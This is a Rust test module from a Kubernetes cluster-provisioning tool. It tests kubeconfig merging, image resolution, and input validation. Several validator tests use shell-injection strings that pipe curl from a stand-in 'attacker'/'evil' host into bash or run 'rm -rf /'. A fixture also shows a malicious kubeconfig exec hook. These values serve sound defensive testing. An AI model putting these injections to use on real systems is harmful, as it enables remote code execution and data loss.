        // confirms the file is not just parseable but USABLE: missing only
        // the plugin binaries (expected — none are on disk in a unit test).
        let tmp = tempfile::tempdir().unwrap();
        let conf_dir = tmp.path().join("net.d");
        std::fs::create_dir_all(&conf_dir).unwrap();
        std::fs::write(conf_dir.join("10-bridge.conflist"), &json).unwrap();
        match delonix_sdn::cni::readiness(&conf_dir, &[tmp.path().join("bin")]) {
            delonix_sdn::cni::Readiness::PluginMissing(m) => {
                assert_eq!(m, ["bridge", "host-local", "portmap"]);
            }
            other => panic!("expected PluginMissing (no binaries in this test), got {other:?}"),
        }
    }

    /// Whatever subnet the manifest declares has to land in the conflist
    /// unmangled — a typo'd interpolation here would silently hand every
    /// pod on the node an address outside `spec.podSubnet`.
    #[test]
    fn single_node_bridge_conflist_carries_the_exact_pod_subnet() {
        let json = single_node_bridge_conflist("192.168.77.0/24");
        assert!(json.contains("\"subnet\":\"192.168.77.0/24\""), "{json}");
    }

    /// A state root and a `$HOME` in one temp dir, each with its own files —
    /// the shape of the defect: an isolated `DELONIX_ROOT` on a host whose
    /// `~/.kube` holds real clusters.
    fn kubeconfig_fixture(
        cached: &[&str],
        home_kube: &[&str],
    ) -> (tempfile::TempDir, PathBuf, PathBuf) {
        let base = tempfile::tempdir().unwrap();
        let root = base.path().join("root");
        let home = base.path().join("home");
        std::fs::create_dir_all(root.join("clusters")).unwrap();
        std::fs::create_dir_all(home.join(".kube")).unwrap();
        for n in cached {
            std::fs::write(
                root.join("clusters").join(format!("{n}-kubeconfig.yaml")),
                "",
            )
            .unwrap();
        }
        for n in home_kube {
            std::fs::write(home.join(".kube").join(format!("config-{n}")), "").unwrap();
        }
        std::fs::write(home.join(".kube").join("config"), "").unwrap();
        (base, root, home)
    }

    /// The defect of 2026-09-16: with an EMPTY `DELONIX_ROOT`, `cluster
    /// kubeconfig` said "2 cluster kubeconfigs cached … delonix-dev, dev" —
    /// names read from `~/.kube/config-*`, outside the state root. Resolving an
    /// omitted name looks at the state root and nothing else.
    #[test]
    fn kubeconfig_without_a_name_only_sees_the_state_root() {
        let (_empty, root, home) = kubeconfig_fixture(&[], &["delonix-dev", "dev"]);
        assert!(cached_kubeconfig_names_in(&root).is_empty());
        let err = resolve_kubeconfig_name_in(None, &root)
            .unwrap_err()
            .to_string();
        assert!(err.contains("no cluster kubeconfig cached"), "{err}");
        assert!(!err.contains("dev"), "read outside the state root: {err}");

        let (_one, one, _) = kubeconfig_fixture(&["ck1"], &["delonix-dev", "dev"]);
        assert_eq!(resolve_kubeconfig_name_in(None, &one).unwrap(), "ck1");

        let (_two, root, _) = kubeconfig_fixture(&["ck2", "ck1"], &["delonix-dev"]);
        let err = resolve_kubeconfig_name_in(None, &root)
            .unwrap_err()
            .to_string();
        assert!(err.contains("2 cluster kubeconfigs cached"), "{err}");
        assert!(
            err.contains("ck1, ck2") && !err.contains("delonix-dev"),
            "{err}"
        );

        // An explicit name is still passed through untouched.
        assert_eq!(
            resolve_kubeconfig_name_in(Some("x".into()), &root).unwrap(),
            "x"
        );

        // The `cluster <name> <kubectl…>` hint keeps naming what it CAN read,
        // `~/.kube/config-<name>` included — and not `~/.kube/config` itself.
        assert_eq!(
            reachable_kubeconfig_names_in(&root, Some(&home)),
            vec!["ck1", "ck2", "delonix-dev", "dev"]
        );
        assert_eq!(
            reachable_kubeconfig_names_in(&root, None),
            vec!["ck1", "ck2"]
        );
    }

    /// Gap closed: host prep now runs in parallel (`std::thread::scope`) instead of
    /// one SSH round-trip at a time. Unlike the old fail-fast loop, ALL hosts are
    /// attempted and ALL failures are reported together — locks in that aggregation.
    #[test]
    fn combine_host_prep_errors_agrega_todas_as_falhas() {
        assert!(combine_host_prep_errors(vec![]).is_ok());
        let err = combine_host_prep_errors(vec!["[cp1] falhou".into(), "[w1] falhou".into()])
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("[cp1] falhou"), "{msg}");
        assert!(msg.contains("[w1] falhou"), "{msg}");
    }

    #[test]
    fn vm_names_gera_nomes_deterministicos() {
        assert_eq!(vm_names("prod", "cp", 2), vec!["prod-cp1", "prod-cp2"]);
        assert_eq!(
            vm_names("prod", "w", 3),
            vec!["prod-w1", "prod-w2", "prod-w3"]
        );
        assert_eq!(vm_names("prod", "cp", 0), Vec::<String>::new());
    }

    #[test]
    fn official_pull_source_resolve_bare_versions_against_the_official_repo() {
        // The bug this fixes: `--vm-image 1.35`/`--k8s-version 1.35` (no
        // local qcow2) used to be a dead end — never attempted a pull.
        assert_eq!(
            official_pull_source("1.35"),
            "ghcr.io/angolardevops/delonix-vm-k8s:1.35"
        );
        // `resolve_vm_image`'s own `--k8s-version` convention
        // (`delonix-vm-k8s:<v>`) must resolve to the SAME source, not double
        // up the repo prefix.
        assert_eq!(
            official_pull_source("delonix-vm-k8s:1.35"),
            "ghcr.io/angolardevops/delonix-vm-k8s:1.35"
        );
    }

    #[test]
    fn official_pull_source_leaves_full_references_untouched() {
        assert_eq!(
            official_pull_source("ghcr.io/someoneelse/other-image:2.0"),
            "ghcr.io/someoneelse/other-image:2.0"
        );
    }

    fn fake_admin_conf() -> String {
        // Shape of a real kubeadm admin.conf: always the SAME fixed names
        // (`kubernetes`/`kubernetes-admin`/`kubernetes-admin@kubernetes`),
        // which is exactly why a naive merge would collide across clusters.
        // Raw string, flush left: a `\`-continued literal would strip the
        // leading whitespace of each line, flattening this YAML's nesting.
        r#"apiVersion: v1
kind: Config
clusters:
- name: kubernetes
  cluster:
    server: https://1.2.3.4:6443
contexts:
- name: kubernetes-admin@kubernetes
  context:
    cluster: kubernetes
    user: kubernetes-admin
current-context: kubernetes-admin@kubernetes
users:
- name: kubernetes-admin
  user:
    client-certificate-data: AAAA
"#
        .to_string()
    }

    #[test]
    fn merge_kubeconfig_recusa_exec_e_insecure_skip_de_um_admin_conf_malicioso() {
        // HIGH fixed here: a compromised control-plane host's admin.conf can
        // legally carry an `exec:` auth-provider (arbitrary LOCAL command
        // execution the next time `kubectl` uses this context) or
        // `insecure-skip-tls-verify: true`. Neither may survive the merge.
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        std::fs::write(
            &source,
            r#"apiVersion: v1
kind: Config
clusters:
- name: kubernetes
  cluster:
    server: https://1.2.3.4:6443
    certificate-authority-data: AAAA
    insecure-skip-tls-verify: true
contexts:
- name: kubernetes-admin@kubernetes
  context:
    cluster: kubernetes
    user: kubernetes-admin
current-context: kubernetes-admin@kubernetes
users:
- name: kubernetes-admin
  user:
    client-certificate-data: BBBB
    client-key-data: CCCC
    exec:
      command: touch
      args: ["/tmp/pwned-via-kubeconfig"]
"#,
        )
        .unwrap();
        let dest = tmp.path().join("config");

        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();

        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        // The legitimate fields survive...
        assert_eq!(
            merged["clusters"][0]["cluster"]["server"],
            "https://1.2.3.4:6443"
        );
        assert_eq!(
            merged["clusters"][0]["cluster"]["certificate-authority-data"],
            "AAAA"
        );
        assert_eq!(
            merged["users"][0]["user"]["client-certificate-data"],
            "BBBB"
        );
        // ...but the dangerous ones never made it into the operator's real config.
        assert!(merged["clusters"][0]["cluster"]
            .get("insecure-skip-tls-verify")
            .is_none());
        assert!(merged["users"][0]["user"].get("exec").is_none());
    }

    #[test]
    fn merge_kubeconfig_renomeia_e_cria_de_novo() {
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        std::fs::write(&source, fake_admin_conf()).unwrap();
        let dest = tmp.path().join("config");

        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();

        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        assert_eq!(merged["clusters"][0]["name"], "lab");
        assert_eq!(merged["contexts"][0]["name"], "lab");
        assert_eq!(merged["contexts"][0]["context"]["cluster"], "lab");
        assert_eq!(merged["contexts"][0]["context"]["user"], "lab-admin");
        assert_eq!(merged["users"][0]["name"], "lab-admin");
        // Fresh file: current-context follows the new (only) cluster.
        assert_eq!(merged["current-context"], "lab");
    }

    #[test]
    fn merge_kubeconfig_acumula_varios_clusters_sem_colidir() {
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        let dest = tmp.path().join("config");

        // 1st cluster: creates the file, becomes current-context.
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();
        // 2nd, DIFFERENT cluster, same kubeadm fixed names in its own admin.conf —
        // the historical bug: this used to be a no-op because ~/.kube/config
        // already existed, so `prod`'s context never made it in at all.
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "prod", &dest, ContextTakeover::Keep).unwrap();

        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        let names = |key: &str| -> Vec<String> {
            merged[key]
                .as_sequence()
                .unwrap()
                .iter()
                .map(|e| e["name"].as_str().unwrap().to_string())
                .collect()
        };
        assert_eq!(names("clusters"), vec!["lab", "prod"]);
        assert_eq!(names("contexts"), vec!["lab", "prod"]);
        assert_eq!(names("users"), vec!["lab-admin", "prod-admin"]);
        // The 2nd write must NOT silently switch what `kubectl` already points to.
        assert_eq!(merged["current-context"], "lab");

        // Re-running for `lab` REPLACES its 3 entries, never duplicates them.
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();
        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        assert_eq!(merged["clusters"].as_sequence().unwrap().len(), 2);
    }

    #[test]
    fn merge_kubeconfig_replaces_a_dangling_or_absent_current_context() {
        // A context that is set but DANGLING is not a preference to protect.
        // Reported live: `current-context` absent while three contexts sat in
        // the file, so a bare `kubectl` went to localhost:8080 and failed with
        // an error that reads like a broken cluster.
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        let dest = tmp.path().join("config");

        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();

        let mut m: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        m["current-context"] = serde_yaml::Value::String("gone-with-the-vm".into());
        std::fs::write(&dest, serde_yaml::to_string(&m).unwrap()).unwrap();
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "novo", &dest, ContextTakeover::Keep).unwrap();
        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        assert_eq!(
            merged["current-context"], "novo",
            "a dangling current-context must be replaced by the cluster just created"
        );

        // Same for no selection at all.
        let mut m: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        m.as_mapping_mut().unwrap().remove("current-context");
        std::fs::write(&dest, serde_yaml::to_string(&m).unwrap()).unwrap();
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "outro", &dest, ContextTakeover::Keep).unwrap();
        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        assert_eq!(
            merged["current-context"], "outro",
            "an absent current-context must be filled by the cluster just created"
        );
    }

    /// `--use-context` decided from the state that actually matters: a
    /// kubeconfig that ALREADY selects a usable context. Both directions, in
    /// one test, because the whole point is that they differ — without the
    /// flag a second cluster must not move the selection (the invariant the
    /// multi-cluster accumulation test above pins, and which the live incident
    /// recorded at the decision point produced), and WITH it a bare `kubectl
    /// get nodes` has to reach the cluster just created instead of the
    /// previous one.
    #[test]
    fn merge_kubeconfig_takes_over_current_context_only_when_asked() {
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        let dest = tmp.path().join("config");
        let read = || -> serde_yaml::Value {
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap()
        };
        let current = || -> String {
            read()["current-context"]
                .as_str()
                .unwrap_or_default()
                .into()
        };
        let names = |key: &str| -> Vec<String> {
            read()[key]
                .as_sequence()
                .unwrap()
                .iter()
                .map(|e| e["name"].as_str().unwrap().to_string())
                .collect()
        };
        let merge = |name: &str, takeover: ContextTakeover| {
            std::fs::write(&source, fake_admin_conf()).unwrap();
            merge_into_local_kubeconfig(&source, name, &dest, takeover).unwrap();
        };

        // The precondition the old behaviour protects: `lab` is in the file AND
        // is what kubectl points at, so the selection is usable — not absent,
        // not dangling.
        merge("lab", ContextTakeover::Keep);
        assert_eq!(current(), "lab", "precondition: a usable selection");

        // Without the flag: merged, and the selection does not move.
        merge("prod", ContextTakeover::Keep);
        assert_eq!(
            current(),
            "lab",
            "a 2nd cluster must not yank the context from someone working in the 1st"
        );

        // With the flag: the selection moves even over a usable one.
        merge("staging", ContextTakeover::Switch);
        assert_eq!(
            current(),
            "staging",
            "--use-context must point kubectl at the cluster just created"
        );
        // And it moved to something kubectl can actually USE: a
        // `current-context` naming an entry that is not in the file is the
        // exact failure this whole decision exists to avoid.
        assert!(names("contexts").contains(&"staging".to_string()));
        assert!(names("clusters").contains(&"staging".to_string()));
        assert!(names("users").contains(&"staging-admin".to_string()));
        // Taking over the selection is not a licence to drop the other
        // clusters — all three are still there, accumulated as before.
        assert_eq!(names("contexts"), vec!["lab", "prod", "staging"]);

        // Switching to a cluster that is ALREADY current is idempotent, not a
        // second entry.
        merge("staging", ContextTakeover::Switch);
        assert_eq!(current(), "staging");
        assert_eq!(names("contexts"), vec!["lab", "prod", "staging"]);
    }

    /// The printed half of the mechanism: when `kubectl` was NOT repointed,
    /// create has to say so AND give the exact command that repoints it, on a
    /// line of its own. Pinned because an operator who never runs that line
    /// has a bare `kubectl get nodes` answering for the PREVIOUS cluster —
    /// and because the command used to sit mid-sentence inside the line above,
    /// where it reads as prose instead of something to copy.
    #[test]
    fn merge_report_prints_the_switch_command_on_its_own_line() {
        let lines = merge_report("/home/op/.kube/config", "prod", "lab");
        assert_eq!(lines.len(), 3, "{lines:?}");
        assert!(
            lines[0].contains("kubectl stays on 'lab'"),
            "it must say where kubectl still points: {:?}",
            lines[0]
        );
        assert_eq!(
            lines[2], "    kubectl config use-context prod",
            "the switch command has to be exactly runnable, on its own line"
        );

        // Repointed: no instruction, because there is nothing left to do.
        let lines = merge_report("/home/op/.kube/config", "prod", "prod");
        assert_eq!(lines.len(), 1, "{lines:?}");
        assert!(lines[0].contains("kubectl now points here"), "{lines:?}");
        assert!(
            !lines.iter().any(|l| l.contains("use-context")),
            "telling the operator to switch to the cluster kubectl ALREADY \
             points at is noise: {lines:?}"
        );
    }

    /// Regression (KaaS capability audit, gap #10): the naming convention a
    /// `cluster kubeadm` VM/SSH cluster uses has to be recognized precisely —
    /// `is_cluster_vm` is the ONE place that decides it, shared by whatever
    /// finds the VMs to destroy and (conceptually) by `vm_names`/the `-lb`
    /// literal that create them. A loose match here would make `cluster
    /// destroy foo` also remove an unrelated `foobar-cp1`.
    #[test]
    fn is_cluster_vm_matches_the_naming_convention_exactly() {
        for ok in [
            "lab-cp1",
            "lab-cp12",
            "lab-w1",
            "lab-w3",
            "lab-etcd1",
            "lab-lb",
        ] {
            assert!(is_cluster_vm(ok, "lab"), "{ok} should match cluster 'lab'");
        }
        for not_ok in [
            "labextra-cp1", // different cluster, same prefix characters
            "lab",          // the cluster name itself is not a node
            "lab-",         // no role at all
            "lab-cp",       // no index
            "lab-cpx",      // non-numeric index
            "lab-master1",  // not one of the roles this engine writes
            "other-cp1",    // a different cluster entirely
        ] {
            assert!(
                !is_cluster_vm(not_ok, "lab"),
                "{not_ok} must NOT match cluster 'lab'"
            );
        }
    }

    /// Regression (same gap): removing a VM/SSH cluster's kubeconfig entries
    /// has to find exactly the three names `merge_into_local_kubeconfig`
    /// wrote (`<name>` for cluster+context, `<name>-admin` for the user),
    /// leave every OTHER cluster's entries untouched, and clear
    /// `current-context` only when it was actually pointing here.
    #[test]
    fn remove_local_kubeconfig_entries_removes_only_this_clusters_three_names() {
        let tmp = tempfile::tempdir().unwrap();
        let source = tmp.path().join("admin.conf");
        let dest = tmp.path().join("config");
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "doomed", &dest, ContextTakeover::Keep).unwrap();
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "survivor", &dest, ContextTakeover::Keep).unwrap();

        remove_local_kubeconfig_entries(&dest, "doomed").unwrap();

        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        let names = |key: &str| -> Vec<String> {
            merged[key]
                .as_sequence()
                .unwrap()
                .iter()
                .map(|e| e["name"].as_str().unwrap().to_string())
                .collect()
        };
        assert_eq!(names("clusters"), vec!["survivor"]);
        assert_eq!(names("contexts"), vec!["survivor"]);
        assert_eq!(names("users"), vec!["survivor-admin"]);
        // `doomed` was the current-context (the first cluster merged always
        // is) — clearing it, rather than leaving it dangling, is the point.
        assert!(merged.get("current-context").is_none());
    }

    /// A removal that finds nothing to remove (a name that was never
    /// merged, or no kubeconfig at all) is a no-op, not an error — the
    /// caller in `destroy_vm_cluster` treats a missing kubeconfig as nothing
    /// to clean up, the same way `fetch_kubeconfig`'s own `~/.kube/config`
    /// handling already does.
    #[test]
    fn remove_local_kubeconfig_entries_tolerates_no_match_and_no_file() {
        let tmp = tempfile::tempdir().unwrap();
        let dest = tmp.path().join("config");
        assert!(remove_local_kubeconfig_entries(&dest, "never-existed").is_ok());

        let source = tmp.path().join("admin.conf");
        std::fs::write(&source, fake_admin_conf()).unwrap();
        merge_into_local_kubeconfig(&source, "lab", &dest, ContextTakeover::Keep).unwrap();
        remove_local_kubeconfig_entries(&dest, "not-lab").unwrap();
        let merged: serde_yaml::Value =
            serde_yaml::from_str(&std::fs::read_to_string(&dest).unwrap()).unwrap();
        assert_eq!(
            merged["clusters"].as_sequence().unwrap().len(),
            1,
            "a non-matching name must not touch an unrelated cluster's entries"
        );
    }

    #[test]
    fn resolve_vm_image_usa_a_explicita_sem_tocar_no_store() {
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        assert_eq!(
            resolve_vm_image(&store, Some("minha-tag".to_string()), None).unwrap(),
            "minha-tag"
        );
    }

    #[test]
    fn resolve_vm_image_explicita_prefere_a_convencao_local_ja_puxada() {
        // Bug found live: `delonix vm image pull` (no --name) saves under the
        // convention name `delonix-vm-k8s:1.34`, but a user naturally types
        // `--vm-image 1.34` — the short form. Before this fix that returned
        // "1.34" verbatim, `qcow2_path("1.34")` never matched the real file,
        // and the CLI reported the already-pulled image as missing.
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        store
            .save(&vmimage::VmImage {
                name: "delonix-vm-k8s:1.34".to_string(),
                tag: "delonix-vm-k8s:1.34".to_string(),
                digest: "sha256:abc".to_string(),
                size: 1,
                ubuntu_release: None,
                k8s_version: None,
                created_unix: 0,
                kernel_version: None,
                distro: None,
                default_vcpus: None,
                default_memory: None,
                default_backend: None,
                cloud_init: Some(true),
                ..Default::default()
            })
            .unwrap();
        assert_eq!(
            resolve_vm_image(&store, Some("1.34".to_string()), None).unwrap(),
            "delonix-vm-k8s:1.34"
        );
        // No local match under either form: returned as-is (the caller pulls it).
        assert_eq!(
            resolve_vm_image(&store, Some("1.99".to_string()), None).unwrap(),
            "1.99"
        );
        // An EXACT local match wins over the convention-name guess.
        store
            .save(&vmimage::VmImage {
                name: "custom-name".to_string(),
                tag: "custom-name".to_string(),
                digest: "sha256:def".to_string(),
                size: 1,
                ubuntu_release: None,
                k8s_version: None,
                created_unix: 0,
                kernel_version: None,
                distro: None,
                default_vcpus: None,
                default_memory: None,
                default_backend: None,
                cloud_init: Some(true),
                ..Default::default()
            })
            .unwrap();
        assert_eq!(
            resolve_vm_image(&store, Some("custom-name".to_string()), None).unwrap(),
            "custom-name"
        );
    }

    #[test]
    fn resolve_vm_image_falha_claro_sem_imagens_locais() {
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        let err = resolve_vm_image(&store, None, None).unwrap_err();
        assert!(format!("{err}").contains("build"));
    }

    #[test]
    fn resolve_vm_image_usa_a_unica_existente() {
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        store
            .save(&vmimage::VmImage {
                name: "ubuntu-26.04-k8s".to_string(),
                tag: "ubuntu-26.04-k8s".to_string(),
                digest: "sha256:abc".to_string(),
                size: 1,
                ubuntu_release: Some("26.04".to_string()),
                k8s_version: Some("1.31".to_string()),
                created_unix: 0,
                kernel_version: None,
                distro: None,
                default_vcpus: None,
                default_memory: None,
                default_backend: None,
                cloud_init: Some(true),
                ..Default::default()
            })
            .unwrap();
        assert_eq!(
            resolve_vm_image(&store, None, None).unwrap(),
            "ubuntu-26.04-k8s"
        );
    }

    #[test]
    fn resolve_vm_image_falha_claro_com_multiplas_imagens() {
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        for tag in ["a", "b"] {
            store
                .save(&vmimage::VmImage {
                    name: tag.to_string(),
                    tag: tag.to_string(),
                    digest: "sha256:abc".to_string(),
                    size: 1,
                    ubuntu_release: None,
                    k8s_version: None,
                    created_unix: 0,
                    kernel_version: None,
                    distro: None,
                    default_vcpus: None,
                    default_memory: None,
                    default_backend: None,
                    cloud_init: Some(true),
                    ..Default::default()
                })
                .unwrap();
        }
        let err = resolve_vm_image(&store, None, None).unwrap_err();
        assert!(format!("{err}").contains("--vm-image"));
    }

    #[test]
    fn resolve_vm_image_k8s_version_escolhe_a_convencao_de_nome() {
        let tmp = tempfile::tempdir().unwrap();
        let store = VmImageStore::open(tmp.path()).unwrap();
        for tag in ["delonix-vm-k8s:1.34", "delonix-vm-k8s:1.35"] {
            store
                .save(&vmimage::VmImage {
                    name: tag.to_string(),
                    tag: tag.to_string(),
                    digest: "sha256:abc".to_string(),
                    size: 1,
                    // A `vm pull`ed image has null metadata (known gap) — the
                    // resolution has to work from the NAME, not this field.
                    ubuntu_release: None,
                    k8s_version: None,
                    created_unix: 0,
                    kernel_version: None,
                    distro: None,
                    default_vcpus: None,
                    default_memory: None,
                    default_backend: None,
                    cloud_init: Some(true),
                    ..Default::default()
                })
                .unwrap();
        }
        // 2 local images would normally be an error ("say which one") —
        // `--k8s-version` disambiguates via the naming convention.
        assert_eq!(
            resolve_vm_image(&store, None, Some("1.35")).unwrap(),
            "delonix-vm-k8s:1.35"
        );
        assert_eq!(
            resolve_vm_image(&store, None, Some("1.34")).unwrap(),
            "delonix-vm-k8s:1.34"
        );
        // A version with no matching image falls through to the normal
        // 0/1/N logic (here: still ambiguous, N=2 — an honest error, not a
        // silent wrong pick).
        let err = resolve_vm_image(&store, None, Some("1.99")).unwrap_err();
        assert!(format!("{err}").contains("--vm-image"));
        // Explicit `--vm-image` always wins over `--k8s-version`.
        assert_eq!(
            resolve_vm_image(
                &store,
                Some("delonix-vm-k8s:1.34".to_string()),
                Some("1.35")
            )
            .unwrap(),
            "delonix-vm-k8s:1.34"
        );
    }

    const SAMPLE_KUBEADM_INIT_OUTPUT: &str = "\
Your Kubernetes control-plane has initialized successfully!

To start using your cluster, you need to run the following as a regular user:

  mkdir -p $HOME/.kube
  sudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config
  sudo chown $(id -u):$(id -g) $HOME/.kube/config

You can now join any number of the control-plane node running the following command on each as root:

  kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111 \\
	--control-plane --certificate-key 2222222222222222222222222222222222222222222222222222222222222222

Please note that the certificate-key gives access to cluster sensitive data, keep it secret!
As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use
\"kubeadm init phase upload-certs --upload-certs\" to reload certs afterward.

Then you can join any number of worker nodes by running the following on each as root:

kubeadm join 10.0.0.10:6443 --token abcdef.0123456789abcdef \\
	--discovery-token-ca-cert-hash sha256:1111111111111111111111111111111111111111111111111111111111111111
";

    /// The engine's cache comes FIRST and `~/.kube/config-<name>` second, and
    /// both are always offered. The second place is what makes
    /// `delonix cluster <name> get pods` work on a cluster the engine did not
    /// create -- every `dev` and `producao` cluster in this house is provisioned
    /// by Ansible, which writes exactly that file.
    #[test]
    fn kubeconfig_is_looked_for_in_the_cache_first_then_the_deploy_path() {
        use std::path::Path;
        let v = super::kubeconfig_candidates("lab", Path::new("/state"), Some(Path::new("/h")));
        assert_eq!(
            v,
            vec![
                std::path::PathBuf::from("/state/clusters/lab-kubeconfig.yaml"),
                std::path::PathBuf::from("/h/.kube/config-lab"),
            ]
        );
        // No HOME: the cache is still offered, rather than refusing outright.
        let v = super::kubeconfig_candidates("lab", Path::new("/state"), None);
        assert_eq!(v.len(), 1);
    }

    #[test]
    fn valid_endpoint_aceita_host_ip_e_porta() {
        assert!(valid_endpoint("10.0.0.10"));
        assert!(valid_endpoint("10.0.0.10:6443"));
        assert!(valid_endpoint("lb.exemplo.com"));
        assert!(valid_endpoint("cp1"));
    }

    #[test]
    fn endpoint_with_default_port_nao_duplica_porta_explicita() {
        // BUG regression guard: an HA `controlPlaneEndpoint` with an explicit
        // non-default port (a real setup: an LB/VIP not on 6443) used to
        // become `kubeadm join host:8443:6443` — malformed, breaking every
        // control-plane/worker join on that cluster.
        assert_eq!(
            endpoint_with_default_port("lb.exemplo.com:8443", 6443),
            "lb.exemplo.com:8443"
        );
        assert_eq!(
            endpoint_with_default_port("10.0.0.10:6443", 6443),
            "10.0.0.10:6443"
        );
        // No port given → the default is appended, same as before.
        assert_eq!(
            endpoint_with_default_port("10.0.0.10", 6443),
            "10.0.0.10:6443"
        );
        assert_eq!(
            endpoint_with_default_port("lb.exemplo.com", 6443),
            "lb.exemplo.com:6443"
        );
    }

    #[test]
    fn valid_endpoint_recusa_injeccao_de_comandos() {
        assert!(!valid_endpoint(
            "10.0.0.10; curl http://attacker/pwn.sh | bash; #"
        ));
        assert!(!valid_endpoint("$(curl http://attacker/pwn.sh)"));
        assert!(!valid_endpoint("`whoami`"));
        assert!(!valid_endpoint("10.0.0.10 && rm -rf /"));
        assert!(!valid_endpoint(""));
        assert!(!valid_endpoint("-oProxyCommand=x"));
    }

    #[test]
    fn valid_cidr_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_cidr("10.244.0.0/16"));
        assert!(!valid_cidr("10.244.0.0/16; rm -rf /"));
        assert!(!valid_cidr(""));
    }

    #[test]
    fn valid_version_aceita_formato_normal_e_recusa_injeccao() {
        assert!(valid_version("1.31"));
        assert!(valid_version("1.31.2"));
        assert!(!valid_version("1.31; curl evil|bash; #"));
        assert!(!valid_version("1.31\ncurl evil|bash\n#"));
        assert!(!valid_version(""));
    }

    /// A minimal and VALID `ClusterSpec` in `mode: ssh` (1 control-plane), so
    /// each `validate` test only has to override the field it is exercising.
    fn spec_ssh_1cp() -> ClusterSpec {
        ClusterSpec {
            mode: "ssh".into(),
            control_plane: NodesSpec {
                replicas: None,
                hosts: vec![HostSpec {
                    ip: "10.0.0.1".into(),
                    hostname: None,
                }],
            },
            ..Default::default()
        }
    }

    #[test]
    fn validate_recusa_endpoint_malicioso_no_manifesto_completo() {
        let spec = ClusterSpec {
            control_plane_endpoint: Some("10.0.0.10; curl http://attacker/pwn.sh | bash; #".into()),
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("controlPlaneEndpoint"));
    }

    #[test]
    fn validate_recusa_k8s_version_maliciosa() {
        let spec = ClusterSpec {
            k8s_version: Some("1.31; curl evil|bash #".into()),
            ..spec_ssh_1cp()
        };
        let err = validate(&spec).unwrap_err();
        assert!(format!("{err}").contains("k8sVersion"));
    }

    #[test]
    fn parse_join_info_extrai_token_hash_e_certificate_key() {
        let info = parse_join_info(SAMPLE_KUBEADM_INIT_OUTPUT).unwrap();
        assert_eq!(info.token, "abcdef.0123456789abcdef");
        assert_eq!(
            info.ca_cert_hash,
            "sha256:1111111111111111111111111111111111111111111111111111111111111111"
        );
        assert_eq!(
            info.certificate_key.as_deref(),
            Some("2222222222222222222222222222222222222222222222222222222222222222")
        );
    }

    #[test]
    fn join_info_rejects_shell_injection_from_remote_output() {
        let evil_token = "abcdef.0123456789abcdef$(curl${IFS}evil|bash)";
        let out = SAMPLE_KUBEADM_INIT_OUTPUT.replace("abcdef.0123456789abcdef", evil_token);
        assert!(parse_join_info(&out).is_err());
        let evil_hash = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
            "sha256:1111111111111111111111111111111111111111111111111111111111111111",
            "sha256:`id`",
        );
        assert!(parse_join_info(&evil_hash).is_err());
        let evil_key = SAMPLE_KUBEADM_INIT_OUTPUT.replace(
            "2222222222222222222222222222222222222222222222222222222222222222",
            ";id",
        );
        assert!(parse_join_info(&evil_key).is_err());
    }

    #[test]
    fn kubeadm_formats_are_strict() {
        assert!(valid_kubeadm_token("abcdef.0123456789abcdef"));
        assert!(!valid_kubeadm_token("ABCDEF.0123456789abcdef"));
        assert!(!valid_kubeadm_token("abcdef.0123456789abcde"));
        assert!(!valid_ca_cert_hash("sha256:abc"));
        assert!(!valid_certificate_key(&"g".repeat(64)));
        assert!(valid_certificate_key(&"a".repeat(64)));
    }

